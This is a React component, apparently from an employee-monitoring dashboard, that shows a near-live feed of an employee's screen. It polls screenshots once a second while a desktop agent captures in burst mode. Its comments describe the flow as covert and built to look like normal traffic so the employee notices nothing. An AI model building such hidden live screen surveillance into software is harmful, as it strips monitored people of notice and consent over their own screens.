'use client'

import { useEffect, useRef, useState } from 'react'
import api from '@/lib/api'

interface LiveScreenshot {
  id: string
  userId: string
  capturedAt: string
  url: string
}

interface Props {
  userId: string
  displayName: string
  onClose: () => void
}

// How often the browser re-pokes /streaming/request to refresh the 60s Redis TTL.
// Must be shorter than the TTL (60s) with enough safety margin for network blips.
const KEEPALIVE_INTERVAL_MS = 20_000

// How often the browser polls for a new screenshot. The agent captures at 1 FPS
// in burst mode, so anything faster than 1000ms is wasted bandwidth.
const FRAME_POLL_INTERVAL_MS = 1000

/**
 * Fullscreen live-view overlay driven by the screenshot burst-mode pipeline.
 *
 * Covert flow:
 *  1. On mount, calls POST /streaming/request/:userId — sets a Redis flag
 *     live:watch:{userId}=1 with a 60s TTL.
 *  2. The desktop agent polls GET /agent/sync/commands every 2s. When it sees
 *     liveView=true, it enters burst capture mode (1 FPS screenshots uploaded
 *     via the regular Supabase pipeline — same traffic signature as normal
 *     captures, so the employee sees nothing unusual).
 *  3. This component polls GET /monitoring/screenshots?userId=X&limit=1 every
 *     1000ms and renders the latest frame as an <img>. First fresh frame
 *     usually lands within ~3 seconds of clicking Watch Live.
 *  4. Browser re-calls /streaming/request/:userId every 20s to refresh the TTL.
 *  5. On close, POST /streaming/request/:userId/stop clears the flag and the
 *     agent reverts to its normal 5-min screenshot interval within ~2s.
 */
export function LiveScreenshotView({ userId, displayName, onClose }: Props) {
  const [currentUrl, setCurrentUrl] = useState<string | null>(null)
  const [capturedAt, setCapturedAt] = useState<string | null>(null)
  const [error, setError] = useState<string | null>(null)
  const lastIdRef = useRef<string | null>(null)
  const startTimeRef = useRef<number>(Date.now())
  const [elapsedSec, setElapsedSec] = useState(0)

  // Keep-alive — ping the watch flag on mount and every 20s while mounted.
  useEffect(() => {
    let cancelled = false
    const ping = async () => {
      try {
        await api.post(`/streaming/request/${userId}`)
      } catch (err: any) {
        if (!cancelled) setError(err?.message ?? 'Failed to start live view')
      }
    }
    ping()
    const id = setInterval(ping, KEEPALIVE_INTERVAL_MS)
    return () => {
      cancelled = true
      clearInterval(id)
      // Fire-and-forget stop on unmount. Don't await — we want the modal to
      // close instantly, the agent will pick up the TTL expiry within 2s anyway.
      api.post(`/streaming/request/${userId}/stop`).catch(() => {})
    }
  }, [userId])

  // Frame poller — poll the latest screenshot every 1s.
  useEffect(() => {
    let cancelled = false
    const poll = async () => {
      try {
        const { data } = await api.get('/monitoring/screenshots', {
          params: { userId, limit: 1 },
        })
        if (cancelled) return
        const shots = (data?.data ?? []) as LiveScreenshot[]
        if (shots.length === 0) return
        const latest = shots[0]
        if (latest.id === lastIdRef.current) return
        lastIdRef.current = latest.id
        setCurrentUrl(latest.url)
        setCapturedAt(latest.capturedAt)
      } catch {
        /* transient — next poll will retry */
      }
    }
    poll()
    const id = setInterval(poll, FRAME_POLL_INTERVAL_MS)
    return () => {
      cancelled = true
      clearInterval(id)
    }
  }, [userId])

  // Session timer.
  useEffect(() => {
    const id = setInterval(() => {
      setElapsedSec(Math.floor((Date.now() - startTimeRef.current) / 1000))
    }, 1000)
    return () => clearInterval(id)
  }, [])

  const frameAgeSec = capturedAt
    ? Math.max(0, Math.floor((Date.now() - new Date(capturedAt).getTime()) / 1000))
    : null

  return (
    <div className="fixed inset-0 z-50 bg-black flex flex-col">
      {/* Header */}
      <div className="flex items-center justify-between px-6 py-3 bg-zinc-900 border-b border-zinc-800">
        <div className="flex items-center gap-3">
          <span className="relative flex h-3 w-3">
            <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-500 opacity-75" />
            <span className="relative inline-flex rounded-full h-3 w-3 bg-red-500" />
          </span>
          <h2 className="text-white text-lg font-semibold">{displayName}</h2>
          <span className="text-zinc-400 text-xs">LIVE</span>
          <span className="text-zinc-500 text-xs">
            · {Math.floor(elapsedSec / 60)}m {elapsedSec % 60}s
          </span>
          {frameAgeSec !== null && (
            <span className="text-zinc-500 text-xs">· frame {frameAgeSec}s ago</span>
          )}
        </div>
        <button
          type="button"
          onClick={onClose}
          className="text-zinc-300 hover:text-white text-sm px-4 py-2 rounded-md bg-zinc-800 hover:bg-zinc-700 transition-colors"
        >
          Close
        </button>
      </div>

      {/* Frame */}
      <div className="flex-1 flex items-center justify-center p-4 overflow-hidden">
        {error ? (
          <div className="text-red-400 text-sm">Error: {error}</div>
        ) : currentUrl ? (
          <img
            src={currentUrl}
            alt="Live screen"
            className="max-w-full max-h-full object-contain rounded-lg shadow-2xl"
          />
        ) : (
          <div className="text-zinc-500 text-sm flex flex-col items-center gap-2">
            <div className="w-8 h-8 border-2 border-zinc-700 border-t-blue-500 rounded-full animate-spin" />
            <p>Waiting for first frame…</p>
            <p className="text-xs text-zinc-600">Agent wakes up within ~3 seconds</p>
          </div>
        )}
      </div>
    </div>
  )
}
